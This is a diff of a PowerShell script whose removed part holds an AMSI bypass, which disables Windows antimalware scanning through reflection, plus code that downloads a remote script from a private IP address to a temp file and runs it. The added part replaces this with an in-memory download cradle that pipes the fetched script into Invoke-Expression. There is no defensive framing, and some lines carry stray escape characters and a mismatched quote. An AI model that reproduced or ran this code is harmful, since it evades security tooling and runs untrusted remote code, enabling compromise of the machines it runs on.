@@ -1,51 +1,11 @@
+# URL of the script to download
+$scriptUrl = "http://10.211.55.5:8000/try.ps1”
 
-function Enable-AMSI {
-    try {
-        if (-not [System.Management.Automation.AmsiUtils]::amsiInitFailed) {
-            \$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            $field = $asm.GetField('amsiInitFailed', 'NonPublic,Static')
-            \$field.SetValue(\$null, \$true)
-            Write-Host "[+] AMSI Bypass Successful"
-        }
-    } catch {
-        Write-Warning "[!] AMSI Bypass failed: \$_"
-    }
-}
+# Download the script content
+$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get
 
-\$scriptUrl = "http://10.211.55.5:8000/try.ps1"
-$tempOutputPath = Join-Path $env:TEMP "downloaded_script.ps1"
-
-function Invoke-RemoteDownload {
-    param([string]$Url, [string]$Destination)
-
-    try {
-       
-        Invoke-RestMethod -Uri \$Url -Method Get -OutFile \$Destination -ErrorAction Stop
-        
-        if (Test-Path \$Destination) {
-            Write-Host "[+] Download complete: \$Destination"
-            return \$true
-        }
-    } catch {
-        Write-Error "Download failed: $($_.Exception.Message)"
-        return \$false
-    }
-    return \$false
-}
+# Handle redirection
+$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
 
 
-function Invoke-ScriptExecution {
-    param([string]\$ScriptPath)
-
-    if (-not (Test-Path \$ScriptPath)) {
-        Write-Error "Script file not found at: \$ScriptPath"
-        return
-    }
-
-    try {
-      
-        Unblock-File -Path \$ScriptPath -ErrorAction SilentlyContinue
-
-        Write-Host "[*] Executing script..."
-      
-        & \$ScriptPath
+Invoke-Expression -Command $scriptContent
